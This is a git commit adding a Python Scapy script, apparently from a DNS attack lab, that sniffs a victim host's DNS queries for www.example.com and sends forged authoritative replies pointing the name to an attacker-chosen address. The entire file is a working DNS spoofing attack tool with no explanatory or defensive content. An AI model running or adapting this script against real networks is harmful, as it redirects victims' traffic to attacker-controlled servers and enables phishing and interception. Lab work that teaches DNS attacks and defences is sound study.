ff9afa1e6699116e116a6896cb3edabbd6cf0247
Shivang Soni <34859636+ShivangSoni1998@users.noreply.github.com>
2022-04-11 08:40:32 -0400

    Add files via upload

---
+++ dns_attacks/volumes/dns_directly_spoofing_response.py
@@ -0,0 +1,41 @@
+#!/usr/bin/env python3
+from scapy.all import *
+
+def spoof_dns(pkt):
+  if (DNS in pkt and 'www.example.com' in pkt[DNS].qd.qname.decode('utf-8')):
+
+    pkt.show()
+    # Swap the source and destination IP address
+    IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
+
+    # Swap the source and destination port number
+    UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)
+
+    # The Answer Section
+    Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
+                 ttl=259200, rdata='1.1.1.1')
+
+    # The Authority Section
+    NSsec1 = DNSRR(rrname='example.net', type='NS',
+                   ttl=259200, rdata='ns1.example.net')
+    NSsec2 = DNSRR(rrname='example.net', type='NS',
+                   ttl=259200, rdata='ns2.example.net')
+
+    # The Additional Section
+    Addsec1 = DNSRR(rrname='ns1.example.net', type='A',
+                    ttl=259200, rdata='1.2.3.4')
+    Addsec2 = DNSRR(rrname='ns2.example.net', type='A',
+                    ttl=259200, rdata='5.6.7.8')
+
+    # Construct the DNS packet
+    DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,  
+                 qdcount=1, ancount=1, nscount=0, arcount=0,
+                 an=Anssec)
+
+    # Construct the entire IP packet and send it out
+    spoofpkt = IPpkt/UDPpkt/DNSpkt
+    send(spoofpkt)
+
+# Sniff UDP query packets and invoke spoof_dns().
+f = 'udp and src host 10.9.0.5 and dst port 53'
+pkt = sniff(iface='br-2ebac17c87bd', filter=f, prn=spoof_dns)      
